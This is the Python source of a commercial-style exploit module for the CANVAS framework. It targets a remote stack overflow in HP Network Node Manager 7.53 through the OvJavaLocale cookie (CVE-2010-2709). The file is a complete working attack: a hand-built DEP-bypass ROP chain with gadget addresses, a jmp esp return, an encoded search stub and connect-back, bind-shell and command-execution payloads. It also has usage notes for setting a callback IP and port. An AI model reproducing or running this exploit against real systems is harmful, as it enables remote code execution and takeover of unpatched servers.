
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Hewlett-Packard Network Node Manager v7.53 OvJavaLocale Remote Overflow"
DESCRIPTION = "Exploits a remote overflow in the HP Network Node Manager"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Hewlett-Packard'
DOCUMENTATION["Date public"] = "2010-08-03"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2010-2709"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2709'
DOCUMENTATION["References"] = "http://www.coresecurity.com/content/hp-nnm-ovjavalocale-buffer-overflow"
DOCUMENTATION["Notes"] = """
webappmon.exe is spawned by IIS & runs under the IUSR_<computername> Internet Guest account.
This means exploited nodes and Execute Command shellcode will only be able to execute 
applications that IUSER_<computername> has been granted permission to execute."""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "2000", "XP", "Vista", "7" ]

NOTES="""
---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Hewlett-Packard Network Node Manager v7.53 OvJavaLocale Remote Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Autoversioning
1: Windows 2003 SP1-SP2
2: Windows Other (Non DEP)

Payloads:
0: TCP Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_openviewnnm_ovjavalocale/wp_openviewnnm_ovjavalocale.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 80
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x00000000, 0x00000000, 0x0000), []],
    1 : ["Windows 2003 SP1-SP2", (0x00000000, 0x00000000, 0x0000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows Other (Non DEP)", (0x00000000, 0x00000000, 0x0000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x26\x3f\x7F"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.encode_printable = True
        self.depBuilt = False
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return wp_bannerchecktest(self,self.host,self.port,{"Hewlett-Packard Development Company": 1},1000,"GET /OvCgi/webappmon.exe HTTP/1.0\r\n\r\n")

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def DEPBypassWin2k3(self,size=2200, search=False):
        
        size = size + 48
                          
        if not self.depBuilt:                
            self.log("WP> Building Universal Windows 2003 DEP bypass using VirtualProtect")
            
        depBypass =""
        depBypass += pack('<L', 0x77BE8B31)  	# PUSH ESP, POP ESI  - Store page in ESI
        depBypass += wp_randomstring(4)         #                    - Padding
        depBypass += pack('<L', 0x77BAF38E)  	# MOV EAX, ESI       - Move page into EAX
        depBypass += wp_randomstring(24)        #                    - Padding
        depBypass += pack('<L', 0x77BC5F6C)  	# ADD EAX, 58 / RETN - Point page further down stack
        depBypass += pack('<L', 0x77BCC397)  	# ADD EAX, 2C / RETN - Point page further down stack
        depBypass += wp_randomstring(4)         #                    - Padding       
        depBypass += pack('<L', 0x77BAF7CD)  	# ADD EAX, 0C / RETN - Point page further down stack
        depBypass += pack('<L', 0x77BAF7CD)  	# ADD EAX, 0C / RETN - Point page further down stack
        depBypass += pack('<L', 0x77BDCA9B)  	# XCHG EAX, EDI      - Move page to EDI for storage
        
        if search:
            depBypass += pack('<L', 0x77BB4629)     # XOR EAX, EAX
            depBypass += pack('<L', 0x77BC5F6C)     # ADD EAX, 58
            depBypass += pack('<L', 0x77BC5F6C)     # ADD EAX, 58
            depBypass += pack('<L', 0x77BC5F6C)     # ADD EAX, 58
            depBypass += pack('<L', 0x77BC5F6C)     # ADD EAX, 58
        else:
            depBypass += pack('<L', 0x77BB2563)  	# POP EAX       - Prepare for calculation
            depBypass += pack('<L', 0x22222222)  	# EAX value
            depBypass += pack('<L', 0x77BAFDEA)  	# POP ECX (was 0x77BAFB3A then 0x77BB1C65)
        
            size = 0x22222222 - size              # This is the size calculation
            while hasbadchar(size,self.badstring):
                size -= 1
            
            depBypass += pack('<L', size & 0xffffffff) # Our ESI Adjustment for size
            depBypass += pack('<L', 0x77BD87CA)  	# Sub EAX,ECX  - Do size calculation
        
        depBypass += pack('<L', 0x77BEABB4)  	# STOSD              - Set dwSize                 
        depBypass += pack('<L', 0x77BB4646)  	# XOR EAX, EAX       - Set EAX to null (was 0x77BAF410)
        depBypass += pack('<L', 0x77BACD49)  	# ADD EAX, 20        - Set EAX to 40 (was 0x77BDFC1D)
        depBypass += wp_randomstring(4)         #                    - Padding
        depBypass += pack('<L', 0x77BACD49)  	# ADD EAX, 20        - Set EAX to 40 (was 0x77BDFC1D)
        depBypass += wp_randomstring(4)         #                    - Padding
        depBypass += pack('<L', 0x77BEABB4)  	# STOSD              - Set PAGE_EXECUTE_READWRITE
        depBypass += pack('<L', 0x77BB2563)  	# POP EAX, RET       - Load Writeable address address for STOSD
        depBypass += pack('<L', 0x77BF5F40)  	#                    - Writeable address (was 0x77BF5F20)
        depBypass += pack('<L', 0x77BEABB4)  	# STOSD              - Set lpflOldProtect
        depBypass += pack('<L', 0x77BDCA9B)  	# XCHG EAX, EDI      - Move stored page to eax
        depBypass += pack('<L', 0x77BBF2FF)  	# XCHG EBP, EAX      - Move stored page into ebp controlling where we return from VirtualProtect
        depBypass += pack('<L', 0x77BE8B31)  	# PUSH ESP, POP ESI  - Set lpAddress
        depBypass += wp_randomstring(4)         #                    - Padding
        depBypass += pack('<L', 0x77BEABB5)  	# RETN               -
        depBypass += wp_randomstring(16)        #                    - Padding
        depBypass += pack('<L', 0x77BBCCBC)  	#                    - Call VirtualProtect
        depBypass += wp_randomstring(16)        #                    - Padding
        depBypass += pack('<L', 0x77BE2265)  	# PUSH ESP / RETN    - Return on to our shellcode... Profit!


        self.depBypass_size = len(depBypass)
        if not self.depBuilt:
            self.log("WP> Universal DEP Bypass Size: %d Bytes" % self.depBypass_size)
            self.depBuilt = True
        return depBypass

    def makesploit(self):
        
        if self.version == 1:
            tagSc = 'c00kc00k'
            tagSc += self.DEPBypassWin2k3((len(self.shellcode)+8))
            tagSc += self.shellcode
        else:
            tagSc = 'c00kc00k'
            tagSc += self.shellcode
        
        payload =  'GET /OvCgi/webappmon.exe?ins=nowait&sel=%s&app%s=&act%s=&arg=&help='%(wp_randomstring(1), wp_randomstring(1), wp_randomstring(1)) 
        payload += tagSc
        payload += '&cache=1600 HTTP/1.1\r\n'
        payload += 'Host: %s\r\n' % self.host
        payload += 'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\r\n'
        payload += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
        payload += 'Accept-Language: en-us,en;q=0.5\r\n'
        payload += 'Accept-Encoding: gzip,deflate\r\n'
        payload += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
        payload += 'Keep-Alive: 300\r\n'
        payload += 'Connection: keep-alive\r\n'
        payload += 'Cookie: OvJavaLocale='
        payload += wp_randomstring(5096)
        
        if self.version == 1:
            searchcode = wp_SearchCode(True)        
        else:
            searchcode = wp_SearchCode(False)
        searchcode = self.wp_encodeShellcode(self.badstring,searchcode)
        
        if self.version == 1: 
            payload += self.DEPBypassWin2k3(len(searchcode)+8, True)
            payload += searchcode
        else:
            payload += pack('<L', 0x5A212A4A) # jmp esp - ovsnmp.dll
            payload += searchcode
        
        payload += '.Cp1252;OvWebSession=14150:AnyUser%3a\r\n'
        payload += 'Cache-Control: max-age=0\r\n\r\n'
        
        return payload


    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        payload = self.makesploit()
        
        self.result_error = 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.sendall(payload)
            
            time.sleep(5)

            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        self.log("WP> Sent - Payload may take a moment to execute")

        time.sleep(10)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
